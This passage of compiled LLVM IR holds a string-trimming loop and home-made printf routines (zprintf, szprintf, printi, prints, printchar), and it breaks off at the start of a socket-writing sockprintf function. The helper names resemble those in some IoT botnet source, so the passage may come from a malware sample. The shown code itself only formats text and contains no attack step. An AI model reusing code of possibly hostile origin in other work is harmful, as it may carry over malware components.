  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !4
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !4
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !7, !noalias !4
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !7, !noalias !4
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !9

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !4
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !4
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !7, !noalias !4
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !7, !noalias !4
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !4
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !4
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !7, !noalias !4
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !7, !noalias !4
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !4
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !4
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !7, !noalias !4
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !7, !noalias !4
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !4
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !4
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !7, !noalias !4
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !7, !noalias !4
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !11

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #16
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !12

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %136, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %136 ]
  %.0 = phi i8* [ %1, %3 ], [ %137, %136 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %132 [
    i8 0, label %138
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %138
    i8 37, label %132
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %136 [
    i8 115, label %33
    i8 100, label %51
    i8 120, label %67
    i8 88, label %83
    i8 117, label %99
    i8 99, label %115
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i8**
  %46 = load i8*, i8** %45, align 8
  %47 = icmp ne i8* %46, null
  %48 = select i1 %47, i8* %46, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i64 0, i64 0)
  %49 = tail call fastcc i32 @prints(i8** %0, i8* %48, i32 %.064.lcssa, i32 %.063.lcssa)
  %50 = add nsw i32 %49, %.061
  br label %136

; <label>:51:                                     ; preds = %.critedge
  %52 = load i32, i32* %5, align 8
  %53 = icmp ult i32 %52, 41
  br i1 %53, label %54, label %59

; <label>:54:                                     ; preds = %51
  %55 = load i8*, i8** %6, align 8
  %56 = sext i32 %52 to i64
  %57 = getelementptr i8, i8* %55, i64 %56
  %58 = add i32 %52, 8
  store i32 %58, i32* %5, align 8
  br label %62

; <label>:59:                                     ; preds = %51
  %60 = load i8*, i8** %7, align 8
  %61 = getelementptr i8, i8* %60, i64 8
  store i8* %61, i8** %7, align 8
  br label %62

; <label>:62:                                     ; preds = %59, %54
  %.in68 = phi i8* [ %57, %54 ], [ %60, %59 ]
  %63 = bitcast i8* %.in68 to i32*
  %64 = load i32, i32* %63, align 4
  %65 = tail call fastcc i32 @printi(i8** %0, i32 %64, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %66 = add nsw i32 %65, %.061
  br label %136

; <label>:67:                                     ; preds = %.critedge
  %68 = load i32, i32* %5, align 8
  %69 = icmp ult i32 %68, 41
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %67
  %71 = load i8*, i8** %6, align 8
  %72 = sext i32 %68 to i64
  %73 = getelementptr i8, i8* %71, i64 %72
  %74 = add i32 %68, 8
  store i32 %74, i32* %5, align 8
  br label %78

; <label>:75:                                     ; preds = %67
  %76 = load i8*, i8** %7, align 8
  %77 = getelementptr i8, i8* %76, i64 8
  store i8* %77, i8** %7, align 8
  br label %78

; <label>:78:                                     ; preds = %75, %70
  %.in67 = phi i8* [ %73, %70 ], [ %76, %75 ]
  %79 = bitcast i8* %.in67 to i32*
  %80 = load i32, i32* %79, align 4
  %81 = tail call fastcc i32 @printi(i8** %0, i32 %80, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %82 = add nsw i32 %81, %.061
  br label %136

; <label>:83:                                     ; preds = %.critedge
  %84 = load i32, i32* %5, align 8
  %85 = icmp ult i32 %84, 41
  br i1 %85, label %86, label %91

; <label>:86:                                     ; preds = %83
  %87 = load i8*, i8** %6, align 8
  %88 = sext i32 %84 to i64
  %89 = getelementptr i8, i8* %87, i64 %88
  %90 = add i32 %84, 8
  store i32 %90, i32* %5, align 8
  br label %94

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr i8, i8* %92, i64 8
  store i8* %93, i8** %7, align 8
  br label %94

; <label>:94:                                     ; preds = %91, %86
  %.in66 = phi i8* [ %89, %86 ], [ %92, %91 ]
  %95 = bitcast i8* %.in66 to i32*
  %96 = load i32, i32* %95, align 4
  %97 = tail call fastcc i32 @printi(i8** %0, i32 %96, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %98 = add nsw i32 %97, %.061
  br label %136

; <label>:99:                                     ; preds = %.critedge
  %100 = load i32, i32* %5, align 8
  %101 = icmp ult i32 %100, 41
  br i1 %101, label %102, label %107

; <label>:102:                                    ; preds = %99
  %103 = load i8*, i8** %6, align 8
  %104 = sext i32 %100 to i64
  %105 = getelementptr i8, i8* %103, i64 %104
  %106 = add i32 %100, 8
  store i32 %106, i32* %5, align 8
  br label %110

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %7, align 8
  %109 = getelementptr i8, i8* %108, i64 8
  store i8* %109, i8** %7, align 8
  br label %110

; <label>:110:                                    ; preds = %107, %102
  %.in65 = phi i8* [ %105, %102 ], [ %108, %107 ]
  %111 = bitcast i8* %.in65 to i32*
  %112 = load i32, i32* %111, align 4
  %113 = tail call fastcc i32 @printi(i8** %0, i32 %112, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %114 = add nsw i32 %113, %.061
  br label %136

; <label>:115:                                    ; preds = %.critedge
  %116 = load i32, i32* %5, align 8
  %117 = icmp ult i32 %116, 41
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %115
  %119 = load i8*, i8** %6, align 8
  %120 = sext i32 %116 to i64
  %121 = getelementptr i8, i8* %119, i64 %120
  %122 = add i32 %116, 8
  store i32 %122, i32* %5, align 8
  br label %126

; <label>:123:                                    ; preds = %115
  %124 = load i8*, i8** %7, align 8
  %125 = getelementptr i8, i8* %124, i64 8
  store i8* %125, i8** %7, align 8
  br label %126

; <label>:126:                                    ; preds = %123, %118
  %.in = phi i8* [ %121, %118 ], [ %124, %123 ]
  %127 = bitcast i8* %.in to i32*
  %128 = load i32, i32* %127, align 4
  %129 = trunc i32 %128 to i8
  store i8 %129, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %130 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %131 = add nsw i32 %130, %.061
  br label %136

; <label>:132:                                    ; preds = %12, %10
  %133 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %134 = zext i8 %133 to i32
  tail call fastcc void @printchar(i8** %0, i32 %134)
  %135 = add nsw i32 %.061, 1
  br label %136

; <label>:136:                                    ; preds = %.critedge, %132, %126, %110, %94, %78, %62, %44
  %.162 = phi i32 [ %135, %132 ], [ %50, %44 ], [ %66, %62 ], [ %82, %78 ], [ %98, %94 ], [ %114, %110 ], [ %131, %126 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %132 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %62 ], [ %.2.lcssa, %78 ], [ %.2.lcssa, %94 ], [ %.2.lcssa, %110 ], [ %.2.lcssa, %126 ], [ %.2.lcssa, %.critedge ]
  %137 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:138:                                    ; preds = %12, %10
  %139 = icmp eq i8** %0, null
  br i1 %139, label %142, label %140

; <label>:140:                                    ; preds = %138
  %141 = load i8*, i8** %0, align 8
  store i8 0, i8* %141, align 1
  br label %142

; <label>:142:                                    ; preds = %138, %140
  %143 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %143)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #1 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #3
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #3

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #3
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
